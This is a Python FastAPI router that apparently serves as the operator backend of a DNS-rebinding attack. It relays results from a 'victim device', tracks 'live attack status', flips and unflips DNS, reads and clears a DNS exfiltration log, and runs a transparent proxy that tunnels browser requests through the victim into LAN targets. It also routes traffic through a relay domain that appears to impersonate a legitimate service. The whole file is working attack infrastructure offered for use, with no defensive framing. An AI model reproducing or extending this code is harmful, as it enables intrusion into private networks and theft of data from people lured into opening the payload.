from fastapi import APIRouter, Request
from fastapi.responses import JSONResponse, HTMLResponse
import asyncio, time, httpx, os

router = APIRouter()

_store: dict[str, dict] = {}
_STORE_TTL = 600

# URL of the rebind server's same-origin relay (bypasses Cloudflare)
_REBIND_LOCAL = os.environ.get("REBIND_LOCAL_URL", "http://localhost:15000")

def _cleanup():
    now = time.time()
    for t in list(_store.keys()):
        if now - _store[t]['ts'] > _STORE_TTL:
            del _store[t]

@router.post("/rb/result")
async def post_result(request: Request):
    """Fallback: direct POST from popup (Android/desktop, no Cloudflare block)."""
    try:
        data = await request.json()
    except Exception:
        data = {}
    token = data.get('token', '')
    if not token:
        return JSONResponse({'ok': False, 'error': 'no token'}, status_code=400)
    _cleanup()
    _store[token] = {'result': data, 'ts': time.time()}
    return JSONResponse({'ok': True})

@router.get("/rb/result/{token}")
async def get_result(token: str):
    """Dashboard polls here — checks local store then rebind-server same-origin relay."""
    _cleanup()
    entry = _store.get(token)
    if entry:
        return JSONResponse({'ok': True, 'ready': True, 'result': entry['result']})
    # Fallback: check rebind server's same-origin relay (iOS path)
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/rb/relay/{token}")
            data = r.json()
            if data.get('ready'):
                # Cache it locally for subsequent polls
                _store[token] = {'result': data['result'], 'ts': time.time()}
                return JSONResponse({'ok': True, 'ready': True, 'result': data['result']})
    except Exception:
        pass
    return JSONResponse({'ok': True, 'ready': False})

@router.get("/rb/status/{token}")
async def get_status(token: str):
    """Dashboard polls for live attack status (attempt count, phase)."""
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/rb/relay-status/{token}")
            return JSONResponse(r.json())
    except Exception:
        return JSONResponse({'ok': True, 'status': None})

# ── Tunnel ────────────────────────────────────────────────────────────────────

@router.post("/rb/tunnel/request")
async def tunnel_request(request: Request):
    """Dashboard queues a tunnel browse request."""
    try:
        data = await request.json()
    except Exception:
        return JSONResponse({'ok': False, 'error': 'bad json'}, status_code=400)
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            r = await client.post(f"{_REBIND_LOCAL}/api/tunnel/queue", json=data)
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({'ok': False, 'error': str(e)}, status_code=502)

@router.get("/rb/tunnel/result/{token}/{req_id}")
async def tunnel_result(token: str, req_id: str):
    """Dashboard polls for tunnel response."""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/tunnel/result/{token}/{req_id}")
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({'ok': False, 'error': str(e)}, status_code=502)

@router.get("/rb/flip")
async def rb_flip(target: str):
    """Dashboard pre-flips DNS (operator-controlled, before launching WebClip)."""
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/rb/flip", params={"target": target})
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)}, status_code=502)

@router.get("/rb/unflip")
async def rb_unflip():
    """Dashboard un-flips DNS."""
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/rb/unflip")
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)}, status_code=502)

@router.get("/rb/query-status")
async def rb_query_status():
    """Dashboard polls to detect when the transparent proxy's DNS cache expired."""
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/rb/query-status")
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)}, status_code=502)

@router.post("/rb/tunnel/end")
async def tunnel_end(request: Request):
    """Dashboard closes the tunnel session."""
    try:
        data = await request.json()
    except Exception:
        data = {}
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            r = await client.post(f"{_REBIND_LOCAL}/api/tunnel/end", json=data)
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({'ok': False, 'error': str(e)}, status_code=502)

# ── rb-launch.html proxy endpoints (victim device → clipper → Flask) ──────────
# vpshost (direct IP:15000) is firewalled from the internet; rb-launch.html
# uses these relay paths via clipper.clalitapp.info instead.

@router.get("/rb/tunnel/next/{token}")
async def tunnel_next_relay(token: str):
    """rb-launch.html polls for the next tunnel browse request."""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/tunnel/next/{token}")
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": True, "req_id": None, "error": str(e)})

@router.post("/rb/tunnel/result")
async def tunnel_result_upload(request: Request):
    """rb-launch.html posts tunnel fetch result."""
    try:
        data = await request.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "bad json"}, status_code=400)
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            r = await client.post(f"{_REBIND_LOCAL}/api/tunnel/result", json=data)
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)}, status_code=502)

@router.get("/rb/exfil/log")
async def exfil_log_proxy():
    """Dashboard reads DNS exfil log from the rebind server."""
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            r = await client.get(f"{_REBIND_LOCAL}/api/exfil/log")
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e), "entries": []}, status_code=502)

@router.post("/rb/exfil/clear")
async def exfil_clear_proxy():
    """Dashboard clears the DNS exfil log on the rebind server."""
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            r = await client.post(f"{_REBIND_LOCAL}/api/exfil/clear")
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)}, status_code=502)

@router.get("/rb/tunnel/browse/{token}")
async def tunnel_browse_proxy(token: str, path: str = "/"):
    """Transparent HTTP proxy through the DNS-rebind tunnel.
    Enqueues a browse request, waits for rb-launch.html to fetch it from the LAN target,
    and streams the raw HTML body back — opening this URL in a browser tab shows the target page.
    """
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            q = await client.post(f"{_REBIND_LOCAL}/api/tunnel/queue",
                                  json={"token": token, "url": path})
            req_id = q.json().get("req_id")
        if not req_id:
            return HTMLResponse("<h1>Tunnel error: no req_id</h1>", status_code=502)
        for _ in range(40):
            await asyncio.sleep(0.75)
            async with httpx.AsyncClient(timeout=5.0) as client:
                r = await client.get(f"{_REBIND_LOCAL}/api/tunnel/result/{token}/{req_id}")
                d = r.json()
                if d.get("ready") and d.get("result"):
                    body = (d["result"].get("body") or "")
                    status = d["result"].get("status", 200)
                    return HTMLResponse(content=body, status_code=status)
        return HTMLResponse("<h1>Tunnel timeout — victim did not respond in 30s</h1>", status_code=504)
    except Exception as e:
        return HTMLResponse(f"<h1>Tunnel error: {e}</h1>", status_code=502)

@router.post("/rb/relay-status")
async def relay_status_upload(request: Request):
    """rb-launch.html posts live attack status (phase/attempt) via relay."""
    try:
        data = await request.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "bad json"}, status_code=400)
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            r = await client.post(f"{_REBIND_LOCAL}/api/rb/relay-status", json=data)
            return JSONResponse(r.json())
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)}, status_code=502)
